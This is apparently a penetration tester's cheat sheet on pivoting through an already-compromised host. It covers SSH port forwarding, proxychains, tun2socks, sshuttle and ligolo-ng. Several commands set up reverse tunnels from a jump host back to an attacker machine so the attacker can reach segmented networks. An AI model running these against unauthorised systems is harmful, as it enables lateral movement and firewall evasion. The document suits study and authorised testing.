---
title: "Pivoting"
ShowToc: true
TocOpen: false
build:
  list: never
---


> Use an already-compromised host as a *pivot* to reach networks you can't touch
> directly. Two building blocks: **tunneling** (wrap a PDU inside another, usually
> encrypted) and **port forwarding** (a socket that relays traffic to another socket).
> A port forward rides *through* a tunnel; many forwards can share one tunnel.

## Terminology

| term | meaning |
| ---- | ------- |
| lateral movement | moving from one compromised host to others in the network |
| pivoting | using a compromised host as a relay to reach otherwise-unreachable systems |
| segmentation | splitting a network into zones (internal / DMZ / external) joined by routers+firewalls |
| listening port (LP) | the port the forward listens on |
| destination port (DP) | the far-side socket traffic is delivered to |
| local / remote (SSH) | **local** = the host you run `ssh` *from*; **remote** = the host it connects *to* |

## SSH Port Forwarding — shared syntax

> `-f` background · `-N` no remote shell/command · `-q` quiet. Combine as `-fNq`.
> `host:port` — if host is omitted it defaults to `localhost`.

| mode | flag | mnemonic (left→right) |
| ---- | ---- | --------------------- |
| local | `-L` | `listening(local) : destination(remote)` |
| remote | `-R` | `listening(remote) : destination(local)` |
| dynamic | `-D` | `listening(local)` → SOCKS proxy, destination chosen per-connection |

## SSH Local Port Forward (-L)

> Listen on **your** side, deliver to a socket reachable **from the remote host**.
> The destination is resolved from the remote host's point of view.

```bash
ssh -fNq -L [bind:]LPORT:DEST_HOST:DEST_PORT [user@]jumphost
```

| goal | command |
| ---- | ------- |
| reach service on the jump host itself | `ssh -fNq -L 5555:localhost:80 adam@1.1.1.2` |
| reach a service *behind* the jump host | `ssh -fNq -L 5555:2.2.2.2:80 adam@1.1.1.2` |
| make the listener reachable by other hosts | bind it: `-L 3.3.3.2:5555:2.2.2.2:80` |
| several forwards, one tunnel | `ssh -fNq -L 5555:A:80 -L 6666:B:22 user@jh` |

> `DEST_HOST` is looked up **on the jump host**, so `2.2.2.2` works as long as the
> jump host can route to it. Binding the listener to a specific local IP (not
> localhost) lets a *third* machine use your forward — no `GatewayPorts` needed for `-L`.

## SSH Dynamic Port Forward (-D) + proxychains

> One listening socket hosts a **SOCKS5** proxy; destination is chosen per connection
> (one-to-many). Great for tools that hit many hosts/ports.

```bash
ssh -fNq -D 5555 user@jumphost          # opens SOCKS5 on localhost:5555
```

**SOCKS-aware tools** use the proxy directly:
```bash
curl --socks5 127.0.0.1:5555 http://target/
git config --global http.proxy 'socks5://127.0.0.1:5555'
```

**Everything else** → wrap with **proxychains-ng** (`proxychains4`, pre-installed on Kali):
```bash
# /etc/proxychains4.conf  (last line)
socks5  127.0.0.1 5555

proxychains4 -q <command>                # -q = quiet
```

| caveat | note |
| ------ | ---- |
| TCP only | no UDP, no ICMP (hooks the `connect()` syscall) |
| speed | ~2–10× slower; tune timeouts in the conf |
| Nmap | only `-sT` works; add `-Pn` (no ICMP host discovery). Flaky in practice → prefer tun2socks |

## tun2socks (SOCKS proxy → tun interface)

> Turns a SOCKS proxy into a real **tun interface**, so *any* tool (incl. Nmap) can
> use the dynamic forward. Download the binary from
> [xjasonlyu/tun2socks](https://github.com/xjasonlyu/tun2socks).

```bash
ssh -fNq -D 5555 user@jumphost                                   # 1. SOCKS proxy
sudo ./tun2socks --proxy socks5://127.0.0.1:5555 --device tun0   # 2. map to tun0
sudo ip link set tun0 up                                         # 3. bring it up
sudo ip addr add <ip>/<mask> dev tun0                            # 4. address in target subnet
```

> Flags accept single or double dash (`-proxy` == `--proxy`, it's a Go binary).
> Then route the target subnet via `tun0` (`sudo ip route add <net>/<mask> dev tun0`).

| Nmap caveat | fix |
| ----------- | --- |
| raw-packet / SYN scans don't survive the tunnel | use `-sT` (full connect) |
| UDP won't pass | avoid `-sU` |
| ICMP host discovery won't pass | `-Pn` |
| **every port shows "open"** (no RST relayed back) | `-sV` and trust only ports with a real banner |

## SSH Remote Port Forward (-R)

> The **jump host/target initiates the connection back to you**. Use when the target
> has no SSH server, or a firewall/IDS blocks *inbound* SSH to it.

```bash
ssh -fNq -R [bind:]LPORT:DEST_HOST:DEST_PORT [user@]attacker
```

| goal | command (run from the jump host, connecting back to you) |
| ---- | ------- |
| expose jump host's own service to you | `ssh -fNq -R 5555:localhost:80 you@1.1.1.1` |
| expose a service behind the jump host | `ssh -fNq -R 5555:2.2.2.2:80 you@1.1.1.1` |
| bind listener to a non-loopback IP | needs `GatewayPorts` on the SSH server |

> `GatewayPorts` in the **server's** `/etc/ssh/sshd_config`:
> `no` = listener on localhost only (default) · `clientspecified` = honor the bind
> address in the command · `yes` = bind `0.0.0.0` regardless.

## ssh -J (ProxyJump)

> Chain the SSH **login itself** through one or more jump hosts in a single command —
> you land directly on the target. Unlike `-L`/`-D`/`-R` (which forward tooling), `-J`
> only gets you a shell. The client stays on your box; you authenticate end-to-end.

```bash
ssh -J adam@jumphost eve@target              # single hop
ssh -J adam@jh1,eve@jh2 frank@target         # chain, applied left to right
```

> you authenticate to **each** hop (use SSH keys to avoid repeated prompts); it is
> the clean replacement for the old `ProxyCommand` trick.

## sshuttle ("poor man's VPN")

> Automates dynamic-forward + tun2socks setup in **one command**. Builds a pseudo-VPN
> over SSH; any tool (incl. Nmap) can then reach the subnet. Download:
> [sshuttle/sshuttle](https://github.com/sshuttle/sshuttle).

```bash
sshuttle -r <user>@<ssh-server> <target_net>/<mask>        # route a subnet over SSH
sshuttle --dns -r <user>@<ssh-server> <target_net>/<mask>  # + forward DNS to the remote
sshuttle -r user@jh 0.0.0.0/0 -x 192.168.0.0/24            # everything except an excluded net
```

> Same limits as dynamic-forward + tun2socks: **TCP only**, and Nmap can show every
> port as open — but it removes the tedious manual setup, and adds an easy DNS proxy.

## ligolo-ng (agent-based, the full-featured option)

> No SSH server needed. **Agent** runs on each jump host and connects back to your
> **proxy**; traffic rides a `tun` interface (gVisor), TLS-encrypted. Handles
> TCP/UDP/ICMP, multiple tunnels, and deep (double) pivots.
> [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng) ·
> [docs.ligolo.ng](https://docs.ligolo.ng/)

**Setup (manual interface flow):**
```bash
# attacker: start the proxy
./proxy -selfcert                       # self-signed TLS (testing only); or -autocert via LetsEncrypt
sudo ip tuntap add user <you> mode tun ligolo
sudo ip link set ligolo up

# jump host: run the agent (connects back to the proxy, default port 11601)
./agent -connect <attacker>:11601 -ignore-cert

# attacker proxy prompt: pick the agent, add route, start tunnel
session                                 # select the agent
sudo ip route add <target_net>/<mask> dev ligolo
start --tun ligolo
```

**Handy macros (inside the proxy / agent prompt):**

| macro | does | short form |
| ----- | ---- | ---------- |
| `interface_create --name X` | make a tun interface | `ifcreate` |
| `route_add --name X --route N/M` | add a route to a tunnel | — |
| `start --tun X` | attach interface + start tunnel | — |
| `listener_add --addr 0.0.0.0:P --to 127.0.0.1:P --tcp` | reverse port forward through the agent | — |
| `autoroute` | create iface + route + start tunnel in one go | — |

| task | how |
| ---- | --- |
| reach an agent's **loopback** service | route an IP from the **`240.0.0.0/4`** "magic" range to that agent, then hit that IP (`ip route add 240.0.0.1/32 dev ligolo` → `nmap -sV 240.0.0.1`) |
| **double pivot** | 2nd interface (`ligolo2`) + `listener_add` on jump-host-1 so jump-host-2's agent can reach the proxy |
| multiple loopback forwards | split `240.0.0.0/4` into disjoint ranges, one per agent |
| use target's DNS | add its IP to `/etc/resolv.conf` |
| file transfer to deep target | `listener_add` → download from a web server on your attacker box |

## Choosing a technique

| you want… | use |
| --------- | --- |
| one or two specific ports, SSH available | local / remote port forward (`-L` / `-R`) |
| just a shell on a deep host, SSH available | `ssh -J` (ProxyJump) |
| quick, broad subnet access, SSH available | **sshuttle** |
| Nmap through a SOCKS proxy, SSH available | dynamic (`-D`) + **tun2socks** |
| proper multi-hop pivoting, no SSH needed, UDP/ICMP | **ligolo-ng** |

## General Tips

- Port forward = sockets; tunnel = the encrypted pipe they travel through.
- `-L` resolves the destination on the **remote** side; `-R` resolves it on the **local** (your) side.
- `-J` forwards only the SSH login; `-L`/`-D`/`-R` forward arbitrary tooling.
- Any SOCKS/tun method over TCP tends to make Nmap report ports as open — verify with `-sV`.
- SSH-based methods all need an SSH server on the jump host and are "end-to-end"; ligolo-ng drops both constraints at the cost of dropping an agent binary.
